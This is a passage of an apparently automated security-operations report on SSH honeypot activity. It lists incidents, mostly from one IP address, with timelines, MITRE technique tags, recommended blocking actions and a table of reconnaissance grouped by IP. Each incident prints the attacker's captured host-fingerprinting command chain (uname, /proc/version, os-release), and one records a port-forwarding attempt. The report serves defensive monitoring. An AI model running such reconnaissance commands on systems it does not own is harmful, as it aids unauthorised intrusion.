| `2026-08-12 12:39:17` | `cowrie.command.success` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.command.input` |
| `2026-08-12 12:39:17` | `cowrie.log.closed` |
| `2026-08-12 12:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39cb77c5c46c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:40 |
| **Last Seen** | 2026-08-12 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:40:42` | `cowrie.session.connect` |
| `2026-08-12 12:40:42` | `cowrie.client.version` |
| `2026-08-12 12:40:42` | `cowrie.client.kex` |
| `2026-08-12 12:40:43` | `cowrie.login.success` |
| `2026-08-12 12:40:45` | `cowrie.session.params` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.success` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.command.input` |
| `2026-08-12 12:40:45` | `cowrie.log.closed` |
| `2026-08-12 12:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014e4e9f52e2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:42 |
| **Last Seen** | 2026-08-12 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:42:10` | `cowrie.session.connect` |
| `2026-08-12 12:42:10` | `cowrie.client.version` |
| `2026-08-12 12:42:10` | `cowrie.client.kex` |
| `2026-08-12 12:42:11` | `cowrie.login.success` |
| `2026-08-12 12:42:13` | `cowrie.session.params` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.success` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.command.input` |
| `2026-08-12 12:42:13` | `cowrie.log.closed` |
| `2026-08-12 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c2315fe6d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:43 |
| **Last Seen** | 2026-08-12 12:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:43:40` | `cowrie.session.connect` |
| `2026-08-12 12:43:41` | `cowrie.client.version` |
| `2026-08-12 12:43:41` | `cowrie.client.kex` |
| `2026-08-12 12:43:42` | `cowrie.login.success` |
| `2026-08-12 12:43:43` | `cowrie.session.params` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.success` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.command.input` |
| `2026-08-12 12:43:43` | `cowrie.log.closed` |
| `2026-08-12 12:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713abdead5b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:46 |
| **Last Seen** | 2026-08-12 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:46:43` | `cowrie.session.connect` |
| `2026-08-12 12:46:43` | `cowrie.client.version` |
| `2026-08-12 12:46:43` | `cowrie.client.kex` |
| `2026-08-12 12:46:44` | `cowrie.login.success` |
| `2026-08-12 12:46:46` | `cowrie.session.params` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.success` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.command.input` |
| `2026-08-12 12:46:46` | `cowrie.log.closed` |
| `2026-08-12 12:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc42382df75

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:48 |
| **Last Seen** | 2026-08-12 12:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:48:19` | `cowrie.session.connect` |
| `2026-08-12 12:48:19` | `cowrie.client.version` |
| `2026-08-12 12:48:19` | `cowrie.client.kex` |
| `2026-08-12 12:48:20` | `cowrie.login.success` |
| `2026-08-12 12:48:21` | `cowrie.session.params` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.success` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:21` | `cowrie.command.input` |
| `2026-08-12 12:48:22` | `cowrie.log.closed` |
| `2026-08-12 12:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757fc82183ee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:49 |
| **Last Seen** | 2026-08-12 12:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:49:58` | `cowrie.session.connect` |
| `2026-08-12 12:49:59` | `cowrie.client.version` |
| `2026-08-12 12:49:59` | `cowrie.client.kex` |
| `2026-08-12 12:49:59` | `cowrie.login.success` |
| `2026-08-12 12:50:00` | `cowrie.session.params` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.success` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:00` | `cowrie.command.input` |
| `2026-08-12 12:50:01` | `cowrie.log.closed` |
| `2026-08-12 12:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba68c77ba9d0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 12:50 |
| **Last Seen** | 2026-08-12 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:50:39` | `cowrie.session.connect` |
| `2026-08-12 12:50:39` | `cowrie.client.version` |
| `2026-08-12 12:50:39` | `cowrie.client.kex` |
| `2026-08-12 12:50:39` | `cowrie.login.success` |
| `2026-08-12 12:50:39` | `cowrie.direct-tcpip.request` |
| `2026-08-12 12:50:39` | `cowrie.direct-tcpip.data` |
| `2026-08-12 12:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a54ad62a832

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:51 |
| **Last Seen** | 2026-08-12 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:51:28` | `cowrie.session.connect` |
| `2026-08-12 12:51:28` | `cowrie.client.version` |
| `2026-08-12 12:51:28` | `cowrie.client.kex` |
| `2026-08-12 12:51:29` | `cowrie.login.success` |
| `2026-08-12 12:51:30` | `cowrie.session.params` |
| `2026-08-12 12:51:30` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.success` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.command.input` |
| `2026-08-12 12:51:31` | `cowrie.log.closed` |
| `2026-08-12 12:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c035be73ab6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:52 |
| **Last Seen** | 2026-08-12 12:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:52:54` | `cowrie.session.connect` |
| `2026-08-12 12:52:54` | `cowrie.client.version` |
| `2026-08-12 12:52:54` | `cowrie.client.kex` |
| `2026-08-12 12:52:55` | `cowrie.login.success` |
| `2026-08-12 12:52:57` | `cowrie.session.params` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.success` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:57` | `cowrie.command.input` |
| `2026-08-12 12:52:58` | `cowrie.log.closed` |
| `2026-08-12 12:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23d68836ea1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:54 |
| **Last Seen** | 2026-08-12 12:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:54:19` | `cowrie.session.connect` |
| `2026-08-12 12:54:19` | `cowrie.client.version` |
| `2026-08-12 12:54:19` | `cowrie.client.kex` |
| `2026-08-12 12:54:21` | `cowrie.login.success` |
| `2026-08-12 12:54:22` | `cowrie.session.params` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.success` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:22` | `cowrie.command.input` |
| `2026-08-12 12:54:23` | `cowrie.log.closed` |
| `2026-08-12 12:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **25** | 2026-08-12 10:57 | 2026-08-12 12:53 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-08-12 12:15 | 2026-08-12 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-12 11:10 | 2026-08-12 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **3** | 2026-08-12 11:06 | 2026-08-12 12:34 | 1m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]42` | **3** | 2026-08-12 11:16 | 2026-08-12 11:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]45` | **3** | 2026-08-12 11:16 | 2026-08-12 11:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-12 11:04 | 2026-08-12 11:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-08-12 12:38 | 2026-08-12 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-08-12 12:01 | 2026-08-12 12:45 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]214` | **3** | 2026-08-12 11:32 | 2026-08-12 11:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-12 12:00 | 2026-08-12 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.80.223[.]38` | **2** | 2026-08-12 12:32 | 2026-08-12 12:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-12 11:07 | 2026-08-12 12:07 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `146.158.123[.]60` | **2** | 2026-08-12 12:16 | 2026-08-12 12:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]227` | **2** | 2026-08-12 12:48 | 2026-08-12 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]43` | **2** | 2026-08-12 11:16 | 2026-08-12 11:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]44` | **2** | 2026-08-12 11:16 | 2026-08-12 11:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-08-12 11:30 | 2026-08-12 11:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.254.215[.]142` | **2** | 2026-08-12 12:21 | 2026-08-12 12:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.227.240[.]43` | 1 | 2026-08-12 11:57 | 2026-08-12 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.54.175[.]253` | 1 | 2026-08-12 11:38 | 2026-08-12 11:38 | 11s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-08-12 12:15 | 2026-08-12 12:16 | 42s | 0 | `T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-08-12 11:48 | 2026-08-12 11:48 | 12s | 0 | `T1592` | 🟢 LOW |
| `183.6.64[.]180` | 1 | 2026-08-12 11:10 | 2026-08-12 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.55.70[.]124` | 1 | 2026-08-12 10:58 | 2026-08-12 10:59 | 24s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]7` | 1 | 2026-08-12 12:53 | 2026-08-12 12:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.4.156[.]254` | 1 | 2026-08-12 12:52 | 2026-08-12 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.221.38[.]226` | 1 | 2026-08-12 11:43 | 2026-08-12 11:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.172.184[.]129` | 1 | 2026-08-12 10:58 | 2026-08-12 10:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.194.67[.]30` | 1 | 2026-08-12 12:47 | 2026-08-12 12:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]243` | 1 | 2026-08-12 11:52 | 2026-08-12 11:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-12 12:35 | 2026-08-12 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-08-12 11:22 | 2026-08-12 11:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]36` | 1 | 2026-08-12 12:52 | 2026-08-12 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.131[.]248` | 1 | 2026-08-12 12:24 | 2026-08-12 12:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]216` | 1 | 2026-08-12 11:24 | 2026-08-12 11:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]61` | 1 | 2026-08-12 12:27 | 2026-08-12 12:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]33` | 1 | 2026-08-12 11:48 | 2026-08-12 11:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.141.68[.]122` | 1 | 2026-08-12 11:33 | 2026-08-12 11:34 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
